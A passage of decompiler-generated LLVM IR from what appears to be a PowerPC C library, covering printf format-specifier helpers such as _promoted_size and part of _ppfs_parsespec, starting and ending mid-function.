  %v0_1000ddb4 = phi i32 [ %v1_1000dee8, %dec_label_pc_1000dee8 ], [ 0, %dec_label_pc_1000deec.preheader ]
  %v1_1000ddb4 = mul i32 %v0_1000ddb4, 4
  %v2_1000ddb8 = add i32 %v1_1000ddb4, %v2_1000dec8
  store i32 %v2_1000ddb8, i32* %r9.global-to-local, align 4
  %v1_1000ddbc = add i32 %v2_1000ddb8, 40
  %v2_1000ddbc = inttoptr i32 %v1_1000ddbc to i32*
  %v3_1000ddbc = load i32, i32* %v2_1000ddbc, align 4
  store i32 %v3_1000ddbc, i32* %r0.global-to-local, align 4
  %v2_1000ddc0 = icmp sgt i32 %v3_1000ddbc, 8
  %v3_1000ddc0 = icmp eq i32 %v3_1000ddbc, 8
  store i1 %v2_1000ddc0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ddc0, label %dec_label_pc_1000dee8, label %dec_label_pc_1000ddc8

dec_label_pc_1000ddc8:                            ; preds = %dec_label_pc_1000ddb4
  %v1_1000ddc8 = add i32 %v2_1000dec8, 76
  store i32 %v1_1000ddc8, i32* %r10.global-to-local, align 4
  br i1 %v2_1000ddc0, label %dec_label_pc_1000dde4, label %dec_label_pc_1000ddd0

dec_label_pc_1000ddd0:                            ; preds = %dec_label_pc_1000ddc8
  %v2_1000ddd0 = icmp sgt i32 %v3_1000ddbc, 2
  store i1 %v2_1000ddd0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000ddbc, 3
  br i1 %tmp23, label %dec_label_pc_1000deac, label %dec_label_pc_1000ddfc

dec_label_pc_1000dde4:                            ; preds = %dec_label_pc_1000ddc8
  %v2_1000dde4 = icmp sgt i32 %v3_1000ddbc, 1024
  store i1 %v2_1000dde4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000ddbc, 1025
  br i1 %tmp24, label %dec_label_pc_1000deac, label %dec_label_pc_1000ddf0

dec_label_pc_1000ddf0:                            ; preds = %dec_label_pc_1000dde4
  %v2_1000ddf0 = icmp sgt i32 %v3_1000ddbc, 2048
  %v3_1000ddf0 = icmp eq i32 %v3_1000ddbc, 2048
  store i1 %v2_1000ddf0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ddf0, label %dec_label_pc_1000de04, label %dec_label_pc_1000ddf8

dec_label_pc_1000ddf8:                            ; preds = %dec_label_pc_1000ddf0
  %v2_1000ddf8 = icmp sgt i32 %v3_1000ddbc, 2055
  %v3_1000ddf8 = icmp eq i32 %v3_1000ddbc, 2055
  store i1 %v2_1000ddf8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000ddf8, label %dec_label_pc_1000de60, label %dec_label_pc_1000deac

dec_label_pc_1000ddfc:                            ; preds = %dec_label_pc_1000ddd0
  %v3_1000dddc = icmp eq i32 %v3_1000ddbc, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000dddc, label %dec_label_pc_1000de60, label %dec_label_pc_1000deac

dec_label_pc_1000de04:                            ; preds = %dec_label_pc_1000ddf0
  %v2_1000de04 = inttoptr i32 %v1_1000ddc8 to i8*
  %v3_1000de04 = load i8, i8* %v2_1000de04, align 1
  %v4_1000de04 = zext i8 %v3_1000de04 to i32
  %v2_1000de08 = icmp ugt i8 %v3_1000de04, 6
  store i1 %v2_1000de08, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000de04, 2
  %v1_1000de0c = zext i8 %tmp28 to i32
  store i32 %v1_1000de0c, i32* %r9.global-to-local, align 4
  %v2_1000de10 = add nuw nsw i32 %v1_1000de0c, %v4_1000de04
  store i32 %v2_1000de10, i32* %r0.global-to-local, align 4
  %v1_1000de14 = trunc i32 %v2_1000de10 to i8
  store i8 %v1_1000de14, i8* %v2_1000de04, align 1
  %v0_1000de18 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000de18, label %dec_label_pc_1000de38, label %dec_label_pc_1000de1c

dec_label_pc_1000de1c:                            ; preds = %dec_label_pc_1000de04
  %v0_1000de1c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000de1c = urem i32 %v0_1000de1c, 256
  store i32 %v1_1000de1c, i32* %r9.global-to-local, align 4
  %v0_1000de20 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000de20 = add i32 %v0_1000de20, 8
  %v2_1000de20 = inttoptr i32 %v1_1000de20 to i32*
  %v3_1000de20 = load i32, i32* %v2_1000de20, align 4
  %v1_1000de24 = mul nuw nsw i32 %v1_1000de1c, 4
  store i32 %v1_1000de24, i32* %r0.global-to-local, align 4
  %v1_1000de28 = add nuw nsw i32 %v1_1000de1c, 2
  store i32 %v1_1000de28, i32* %r9.global-to-local, align 4
  %v2_1000de2c = add i32 %v3_1000de20, %v1_1000de24
  store i32 %v2_1000de2c, i32* %r11.global-to-local, align 4
  %v1_1000de30 = trunc i32 %v1_1000de28 to i8
  %v2_1000de30 = load i32, i32* @r3, align 4
  %v3_1000de30 = add i32 %v2_1000de30, 76
  %v4_1000de30 = inttoptr i32 %v3_1000de30 to i8*
  store i8 %v1_1000de30, i8* %v4_1000de30, align 1
  br label %dec_label_pc_1000de4c

dec_label_pc_1000de38:                            ; preds = %dec_label_pc_1000de04
  %v0_1000de38 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000de38 = add i32 %v0_1000de38, 4
  %v2_1000de38 = inttoptr i32 %v1_1000de38 to i32*
  %v3_1000de38 = load i32, i32* %v2_1000de38, align 4
  %v1_1000de3c = add i32 %v3_1000de38, 7
  store i32 %v1_1000de3c, i32* %r9.global-to-local, align 4
  %v1_1000de40 = call i32 @__asm_rlwinm(i32 %v1_1000de3c, i32 0, i32 0, i32 28)
  store i32 %v1_1000de40, i32* %r11.global-to-local, align 4
  %v1_1000de44 = add i32 %v1_1000de40, 8
  store i32 %v1_1000de44, i32* %r0.global-to-local, align 4
  %v1_1000de48 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000de48 = add i32 %v1_1000de48, 4
  %v3_1000de48 = inttoptr i32 %v2_1000de48 to i32*
  store i32 %v1_1000de44, i32* %v3_1000de48, align 4
  br label %dec_label_pc_1000de4c

dec_label_pc_1000de4c:                            ; preds = %dec_label_pc_1000de1c, %dec_label_pc_1000de38
  %v0_1000de4c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000de4c = inttoptr i32 %v0_1000de4c to i32*
  %v2_1000de4c = load i32, i32* %v1_1000de4c, align 4
  store i32 %v2_1000de4c, i32* %r9.global-to-local, align 4
  %v1_1000de50 = add i32 %v0_1000de4c, 4
  %v2_1000de50 = inttoptr i32 %v1_1000de50 to i32*
  %v3_1000de50 = load i32, i32* %v2_1000de50, align 4
  store i32 %v3_1000de50, i32* %r10.global-to-local, align 4
  %v1_1000de54 = load i32, i32* @r8, align 4
  %v2_1000de54 = inttoptr i32 %v1_1000de54 to i32*
  store i32 %v2_1000de4c, i32* %v2_1000de54, align 4
  %v0_1000de58 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000de58 = load i32, i32* @r8, align 4
  %v2_1000de58 = add i32 %v1_1000de58, 4
  %v3_1000de58 = inttoptr i32 %v2_1000de58 to i32*
  store i32 %v0_1000de58, i32* %v3_1000de58, align 4
  br label %dec_label_pc_1000dee4

dec_label_pc_1000de60:                            ; preds = %dec_label_pc_1000ddf8, %dec_label_pc_1000ddfc
  store i32 %v1_1000ddc8, i32* %r10.global-to-local, align 4
  %v1_1000de64 = add i32 %v2_1000dec8, 77
  %v2_1000de64 = inttoptr i32 %v1_1000de64 to i8*
  %v3_1000de64 = load i8, i8* %v2_1000de64, align 1
  %v4_1000de64 = zext i8 %v3_1000de64 to i32
  store i32 %v4_1000de64, i32* %r11.global-to-local, align 4
  %v2_1000de68 = icmp ugt i8 %v3_1000de64, 8
  store i1 %v2_1000de68, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000de64, 7
  br i1 %tmp25, label %dec_label_pc_1000de8c, label %dec_label_pc_1000de70

dec_label_pc_1000de70:                            ; preds = %dec_label_pc_1000de60
  %v1_1000de70 = add i32 %v2_1000dec8, 84
  %v2_1000de70 = inttoptr i32 %v1_1000de70 to i32*
  %v3_1000de70 = load i32, i32* %v2_1000de70, align 4
  %v1_1000de74 = mul nuw nsw i32 %v4_1000de64, 8
  %v1_1000de78 = add nuw nsw i32 %v1_1000de74, 32
  %v2_1000de7c = add i32 %v1_1000de78, %v3_1000de70
  store i32 %v2_1000de7c, i32* %r9.global-to-local, align 4
  %v1_1000de80 = add nuw nsw i32 %v4_1000de64, 1
  store i32 %v1_1000de80, i32* %r0.global-to-local, align 4
  %v1_1000de84 = trunc i32 %v1_1000de80 to i8
  store i8 %v1_1000de84, i8* %v2_1000de64, align 1
  br label %dec_label_pc_1000dee4

dec_label_pc_1000de8c:                            ; preds = %dec_label_pc_1000de60
  %v1_1000de8c = add i32 %v2_1000dec8, 80
  %v2_1000de8c = inttoptr i32 %v1_1000de8c to i32*
  %v3_1000de8c = load i32, i32* %v2_1000de8c, align 4
  %v1_1000de90 = add i32 %v3_1000de8c, 7
  store i32 %v1_1000de90, i32* %r9.global-to-local, align 4
  %v1_1000de94 = call i32 @__asm_rlwinm(i32 %v1_1000de90, i32 0, i32 0, i32 28)
  store i32 %v1_1000de94, i32* %r9.global-to-local, align 4
  %v1_1000de98 = add i32 %v1_1000de94, 8
  store i32 %v1_1000de98, i32* %r0.global-to-local, align 4
  %v1_1000de9c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000de9c = add i32 %v1_1000de9c, 4
  %v3_1000de9c = inttoptr i32 %v2_1000de9c to i32*
  store i32 %v1_1000de98, i32* %v3_1000de9c, align 4
  br label %dec_label_pc_1000dee4

dec_label_pc_1000deac:                            ; preds = %dec_label_pc_1000ddf8, %dec_label_pc_1000ddfc, %dec_label_pc_1000dde4, %dec_label_pc_1000ddd0
  %v2_1000deac = inttoptr i32 %v1_1000ddc8 to i8*
  %v3_1000deac = load i8, i8* %v2_1000deac, align 1
  %v4_1000deac = zext i8 %v3_1000deac to i32
  store i32 %v4_1000deac, i32* %r11.global-to-local, align 4
  %v2_1000deb0 = icmp ugt i8 %v3_1000deac, 8
  store i1 %v2_1000deb0, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000deac, 7
  br i1 %tmp26, label %dec_label_pc_1000ded0, label %dec_label_pc_1000deb8

dec_label_pc_1000deb8:                            ; preds = %dec_label_pc_1000deac
  %v1_1000deb8 = add i32 %v2_1000dec8, 84
  %v2_1000deb8 = inttoptr i32 %v1_1000deb8 to i32*
  %v3_1000deb8 = load i32, i32* %v2_1000deb8, align 4
  %v1_1000debc = mul nuw nsw i32 %v4_1000deac, 4
  %v2_1000dec0 = add i32 %v3_1000deb8, %v1_1000debc
  store i32 %v2_1000dec0, i32* %r9.global-to-local, align 4
  %v1_1000dec4 = add nuw nsw i32 %v4_1000deac, 1
  store i32 %v1_1000dec4, i32* %r0.global-to-local, align 4
  %v1_1000dec8 = trunc i32 %v1_1000dec4 to i8
  store i8 %v1_1000dec8, i8* %v2_1000deac, align 1
  br label %dec_label_pc_1000dedc

dec_label_pc_1000ded0:                            ; preds = %dec_label_pc_1000deac
  %v1_1000ded0 = add i32 %v2_1000dec8, 80
  %v2_1000ded0 = inttoptr i32 %v1_1000ded0 to i32*
  %v3_1000ded0 = load i32, i32* %v2_1000ded0, align 4
  store i32 %v3_1000ded0, i32* %r9.global-to-local, align 4
  %v1_1000ded4 = add i32 %v3_1000ded0, 4
  store i32 %v1_1000ded4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ded4, i32* %v2_1000ded0, align 4
  br label %dec_label_pc_1000dedc

dec_label_pc_1000dedc:                            ; preds = %dec_label_pc_1000deb8, %dec_label_pc_1000ded0
  %v0_1000dedc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dedc = inttoptr i32 %v0_1000dedc to i32*
  %v2_1000dedc = load i32, i32* %v1_1000dedc, align 4
  store i32 %v2_1000dedc, i32* %r0.global-to-local, align 4
  %v1_1000dee0 = load i32, i32* @r8, align 4
  %v2_1000dee0 = inttoptr i32 %v1_1000dee0 to i32*
  store i32 %v2_1000dedc, i32* %v2_1000dee0, align 4
  br label %dec_label_pc_1000dee4

dec_label_pc_1000dee4:                            ; preds = %dec_label_pc_1000de8c, %dec_label_pc_1000de70, %dec_label_pc_1000de4c, %dec_label_pc_1000dedc
  %v0_1000dee4 = load i32, i32* @r8, align 4
  %v1_1000dee4 = add i32 %v0_1000dee4, 8
  store i32 %v1_1000dee4, i32* @r8, align 4
  %v0_1000dee8.pre = load i32, i32* @r7, align 4
  %v0_1000deec.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000dee8

dec_label_pc_1000dee8:                            ; preds = %dec_label_pc_1000ddb4, %dec_label_pc_1000dee4
  %v0_1000deec = phi i32 [ %v2_1000dec8, %dec_label_pc_1000ddb4 ], [ %v0_1000deec.pre, %dec_label_pc_1000dee4 ]
  %v0_1000dee8 = phi i32 [ %v0_1000ddb4, %dec_label_pc_1000ddb4 ], [ %v0_1000dee8.pre, %dec_label_pc_1000dee4 ]
  %v1_1000dee8 = add i32 %v0_1000dee8, 1
  store i32 %v1_1000dee8, i32* @r7, align 4
  %v1_1000deec = add i32 %v0_1000deec, 28
  %v2_1000deec = inttoptr i32 %v1_1000deec to i32*
  %v3_1000deec = load i32, i32* %v2_1000deec, align 4
  store i32 %v3_1000deec, i32* %r0.global-to-local, align 4
  %v2_1000def0 = icmp slt i32 %v1_1000dee8, %v3_1000deec
  %v3_1000def0 = icmp sgt i32 %v1_1000dee8, %v3_1000deec
  store i1 %v3_1000def0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000def0, label %dec_label_pc_1000ddb4, label %dec_label_pc_1000df3c

dec_label_pc_1000defc:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000df00 = icmp ne i32 %v3_1000dd04, -2147483648
  %v4_1000df00 = icmp eq i32 %v3_1000dd04, -2147483648
  store i1 %v3_1000df00, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000df00, label %dec_label_pc_1000df08, label %dec_label_pc_1000df1c

dec_label_pc_1000df08:                            ; preds = %dec_label_pc_1000defc
  %v1_1000df08 = add i32 %v0_1000dcfc, 36
  %v2_1000df08 = inttoptr i32 %v1_1000df08 to i8*
  %v3_1000df08 = load i8, i8* %v2_1000df08, align 1
  %v4_1000df08 = zext i8 %v3_1000df08 to i32
  %v1_1000df0c = mul nuw nsw i32 %v4_1000df08, 8
  %v2_1000df10 = add i32 %v1_1000df0c, %v1_1000dd00
  store i32 %v2_1000df10, i32* %r9.global-to-local, align 4
  %v1_1000df14 = add i32 %v2_1000df10, -8
  %v2_1000df14 = inttoptr i32 %v1_1000df14 to i32*
  %v3_1000df14 = load i32, i32* %v2_1000df14, align 4
  store i32 %v3_1000df14, i32* %r0.global-to-local, align 4
  store i32 %v3_1000df14, i32* %v2_1000dd04, align 4
  %v0_1000df1c.pre = load i32, i32* @r3, align 4
  %v1_1000df20.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000df1c

dec_label_pc_1000df1c:                            ; preds = %dec_label_pc_1000defc, %dec_label_pc_1000df08
  %v1_1000df20 = phi i32 [ -2147483648, %dec_label_pc_1000defc ], [ %v1_1000df20.pre, %dec_label_pc_1000df08 ]
  %v1_1000df38 = phi i32 [ %v0_1000dcfc, %dec_label_pc_1000defc ], [ %v0_1000df1c.pre, %dec_label_pc_1000df08 ]
  %v1_1000df1c = add i32 %v1_1000df38, 4
  %v2_1000df1c = inttoptr i32 %v1_1000df1c to i32*
  %v3_1000df1c = load i32, i32* %v2_1000df1c, align 4
  store i32 %v3_1000df1c, i32* %r0.global-to-local, align 4
  %v3_1000df20 = icmp sgt i32 %v3_1000df1c, %v1_1000df20
  %v4_1000df20 = icmp eq i32 %v3_1000df1c, %v1_1000df20
  store i1 %v3_1000df20, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000df20, label %dec_label_pc_1000df28, label %dec_label_pc_1000df3c

dec_label_pc_1000df28:                            ; preds = %dec_label_pc_1000df1c
  %v1_1000df28 = add i32 %v1_1000df38, 37
  %v2_1000df28 = inttoptr i32 %v1_1000df28 to i8*
  %v3_1000df28 = load i8, i8* %v2_1000df28, align 1
  %v4_1000df28 = zext i8 %v3_1000df28 to i32
  %v1_1000df2c = mul nuw nsw i32 %v4_1000df28, 8
  %v1_1000df30 = load i32, i32* @r8, align 4
  %v2_1000df30 = add i32 %v1_1000df2c, %v1_1000df30
  store i32 %v2_1000df30, i32* %r9.global-to-local, align 4
  %v1_1000df34 = add i32 %v2_1000df30, -8
  %v2_1000df34 = inttoptr i32 %v1_1000df34 to i32*
  %v3_1000df34 = load i32, i32* %v2_1000df34, align 4
  store i32 %v3_1000df34, i32* %r0.global-to-local, align 4
  store i32 %v3_1000df34, i32* %v2_1000df1c, align 4
  %v0_1000df3c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000df3c

dec_label_pc_1000df3c:                            ; preds = %dec_label_pc_1000dee8, %dec_label_pc_1000deec.preheader, %dec_label_pc_1000df1c, %dec_label_pc_1000df28
  %v0_1000df3c = phi i32 [ %v1_1000df38, %dec_label_pc_1000df1c ], [ %v0_1000df3c.pre, %dec_label_pc_1000df28 ], [ %v0_1000deec5, %dec_label_pc_1000deec.preheader ], [ %v0_1000deec, %dec_label_pc_1000dee8 ]
  %v1_1000df3c = add i32 %v0_1000df3c, 8
  %v2_1000df3c = inttoptr i32 %v1_1000df3c to i32*
  %v3_1000df3c = load i32, i32* %v2_1000df3c, align 4
  store i32 %v3_1000df3c, i32* %r11.global-to-local, align 4
  %v2_1000df40 = icmp sgt i32 %v3_1000df3c, 0
  store i1 %v2_1000df40, i1* %cr7_gt.global-to-local, align 1
  %v0_1000df44 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000df3c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000df44)
  %v0_1000df48 = load i32, i32* @r3, align 4
  %v1_1000df48 = add i32 %v0_1000df48, 16
  %v2_1000df48 = inttoptr i32 %v1_1000df48 to i32*
  %v3_1000df48 = load i32, i32* %v2_1000df48, align 4
  store i32 %v3_1000df48, i32* %r0.global-to-local, align 4
  %v0_1000df4c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000df4c = sub i32 0, %v0_1000df4c
  store i32 %v1_1000df4c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000df54 = add i32 %v0_1000df48, 8
  %v3_1000df54 = inttoptr i32 %v2_1000df54 to i32*
  store i32 %v1_1000df4c, i32* %v3_1000df54, align 4
  %v0_1000df58 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000df58 = or i32 %v0_1000df58, 8
  store i32 %v1_1000df58, i32* %r0.global-to-local, align 4
  %v0_1000df5c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000df5c = load i32, i32* @r3, align 4
  %v2_1000df5c = add i32 %v1_1000df5c, 20
  %v3_1000df5c = inttoptr i32 %v2_1000df5c to i32*
  store i32 %v0_1000df5c, i32* %v3_1000df5c, align 4
  %v1_1000df60 = call i32 @__asm_rlwinm(i32 %v1_1000df58, i32 0, i32 0, i32 30)
  store i32 %v1_1000df60, i32* %r0.global-to-local, align 4
  %v1_1000df64 = load i32, i32* @r3, align 4
  %v2_1000df64 = add i32 %v1_1000df64, 16
  %v3_1000df64 = inttoptr i32 %v2_1000df64 to i32*
  store i32 %v1_1000df60, i32* %v3_1000df64, align 4
  %v0_1000df68 = load i32, i32* @r3, align 4
  ret i32 %v0_1000df68

; uselistorder directives
  uselistorder i32 %v3_1000df1c, { 1, 0, 2 }
  uselistorder i32 %v1_1000df20, { 1, 0 }
  uselistorder i32 %v3_1000deec, { 1, 0, 2 }
  uselistorder i32 %v1_1000dee8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000deec, { 0, 2, 1 }
  uselistorder i32 %v4_1000de64, { 1, 0, 2 }
  uselistorder i32 %v1_1000de24, { 1, 0 }
  uselistorder i32 %v1_1000de1c, { 2, 0, 1 }
  uselistorder i32 %v1_1000ddc8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000ddbc, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000ddb4, { 1, 0 }
  uselistorder i32 %v2_1000dec8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000deec5, { 1, 0, 2 }
  uselistorder i32 %v3_1000dd5c, { 1, 0, 2 }
  uselistorder i32 %v2_1000dd8c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000dd04, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000dcfc, { 1, 0, 2 }
  uselistorder i32 %v0_1000dcfc, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 19, 0, 9, 10, 11, 12, 1, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_1000df3c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000df1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dee8, { 1, 0 }
  uselistorder label %dec_label_pc_1000dee4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000dedc, { 1, 0 }
  uselistorder label %dec_label_pc_1000deac, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000de60, { 1, 0 }
  uselistorder label %dec_label_pc_1000de4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ddb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000deec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000dda0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd50, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000df78

dec_label_pc_1000df78:                            ; preds = %dec_label_pc_1000df78, %entry
  %v0_1000df78 = phi i32 [ ptrtoint (i32* @global_var_10017240.627 to i32), %entry ], [ %v1_1000df78, %dec_label_pc_1000df78 ]
  %v1_1000df78 = add i32 %v0_1000df78, -2
  %v2_1000df78 = inttoptr i32 %v1_1000df78 to i16*
  %v3_1000df78 = load i16, i16* %v2_1000df78, align 2
  %v4_1000df78 = sext i16 %v3_1000df78 to i32
  %v4_1000df7c = icmp eq i32 %v4_1000df78, %arg1
  %v3_1000df80.not = icmp ule i32 %v1_1000df78, ptrtoint (i32* @global_var_10017228.628 to i32)
  %brmerge = or i1 %v4_1000df7c, %v3_1000df80.not
  br i1 %brmerge, label %dec_label_pc_1000df8c, label %dec_label_pc_1000df78

dec_label_pc_1000df8c:                            ; preds = %dec_label_pc_1000df78
  %v2_1000df94 = sub i32 %v1_1000df78, ptrtoint (i32* @global_var_10017228.628 to i32)
  %v1_1000df9c = udiv i32 %v2_1000df94, 2
  %v2_1000df9c = and i32 %v2_1000df94, -2147483648
  %v3_1000df9c = or i32 %v1_1000df9c, %v2_1000df9c
  %v2_1000dfa4 = add i32 %v3_1000df9c, ptrtoint (i32* @global_var_10017240.627 to i32)
  %v3_1000dfa4 = inttoptr i32 %v2_1000dfa4 to i8*
  %v4_1000dfa4 = load i8, i8* %v3_1000dfa4, align 1
  %v5_1000dfa4 = zext i8 %v4_1000dfa4 to i32
  ret i32 %v5_1000dfa4

; uselistorder directives
  uselistorder i32 %v2_1000df94, { 1, 0 }
  uselistorder i32 %v1_1000df78, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10017228.628 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10017240.627 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000dfac = load i32, i32* @lr, align 4
  store i32 %v0_1000dfac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000dfc4 = add i32 %tmp, 16
  %v2_1000dfc4 = inttoptr i32 %v1_1000dfc4 to i32*
  %v3_1000dfc4 = load i32, i32* %v2_1000dfc4, align 4
  %v1_1000dfcc = and i32 %v3_1000dfc4, 128
  store i32 %v1_1000dfcc, i32* %r6.global-to-local, align 4
  %v3_1000dfcc = icmp eq i32 %v1_1000dfcc, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000dfe0 = add i32 %tmp, 24
  %v2_1000dfe0 = inttoptr i32 %v1_1000dfe0 to i32*
  %v3_1000dfe0 = load i32, i32* %v2_1000dfe0, align 4
  store i32 %v3_1000dfe0, i32* @r26, align 4
  br i1 %v3_1000dfcc, label %dec_label_pc_1000dfe8, label %dec_label_pc_1000e000

dec_label_pc_1000dfe8:                            ; preds = %entry
  %v2_1000dfe8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000e054

dec_label_pc_1000dff8:                            ; preds = %dec_label_pc_1000e228
  %v1_1000dff8 = add i32 %v0_1000e1f8, 1
  store i32 %v1_1000dff8, i32* @r30, align 4
  br label %dec_label_pc_1000e240

dec_label_pc_1000e000:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000e004 = load i32, i32* %arg1, align 4
  store i32 %v2_1000e004, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000e010 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000e010, i32* @r7, align 4
  br label %dec_label_pc_1000e014

dec_label_pc_1000e014:                            ; preds = %dec_label_pc_1000e044.dec_label_pc_1000e014_crit_edge, %dec_label_pc_1000e000
  %v0_1000e01c = phi i32 [ %v0_1000e01c.pre, %dec_label_pc_1000e044.dec_label_pc_1000e014_crit_edge ], [ %v2_1000e004, %dec_label_pc_1000e000 ]
  %v0_1000e018 = phi i32 [ %v0_1000e018.pre, %dec_label_pc_1000e044.dec_label_pc_1000e014_crit_edge ], [ %v2_1000e010, %dec_label_pc_1000e000 ]
  %v0_1000e020 = phi i32 [ %v0_1000e014.pre, %dec_label_pc_1000e044.dec_label_pc_1000e014_crit_edge ], [ 0, %dec_label_pc_1000e000 ]
  %v1_1000e014 = mul i32 %v0_1000e020, 4
  %v2_1000e018 = add i32 %v0_1000e020, %v0_1000e018
  store i32 %v2_1000e018, i32* %r9.global-to-local, align 4
  %v2_1000e01c = add i32 %v1_1000e014, %v0_1000e01c
  store i32 %v2_1000e01c, i32* %r11.global-to-local, align 4
  %v1_1000e020 = add i32 %v0_1000e020, 1
  store i32 %v1_1000e020, i32* %r10.global-to-local, align 4
  %v1_1000e024 = add i32 %v2_1000e01c, -4
  %v2_1000e024 = inttoptr i32 %v1_1000e024 to i32*
  %v3_1000e024 = load i32, i32* %v2_1000e024, align 4
  store i32 %v3_1000e024, i32* %r0.global-to-local, align 4
  %v1_1000e028 = trunc i32 %v3_1000e024 to i8
  %v3_1000e028 = add i32 %v2_1000e018, 24
  %v4_1000e028 = inttoptr i32 %v3_1000e028 to i8*
  store i8 %v1_1000e028, i8* %v4_1000e028, align 1
  %v0_1000e02c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e02c = urem i32 %v0_1000e02c, 256
  store i32 %v1_1000e02c, i32* %r0.global-to-local, align 4
  %v0_1000e034 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e034 = add i32 %v0_1000e034, -4
  %v2_1000e034 = inttoptr i32 %v1_1000e034 to i32*
  %v3_1000e034 = load i32, i32* %v2_1000e034, align 4
  store i32 %v3_1000e034, i32* %r9.global-to-local, align 4
  %v4_1000e038 = icmp eq i32 %v1_1000e02c, %v3_1000e034
  br i1 %v4_1000e038, label %dec_label_pc_1000e040, label %dec_label_pc_1000e4b0

dec_label_pc_1000e040:                            ; preds = %dec_label_pc_1000e014
  %v3_1000e030 = icmp eq i32 %v1_1000e02c, 0
  br i1 %v3_1000e030, label %dec_label_pc_1000e048, label %dec_label_pc_1000e044

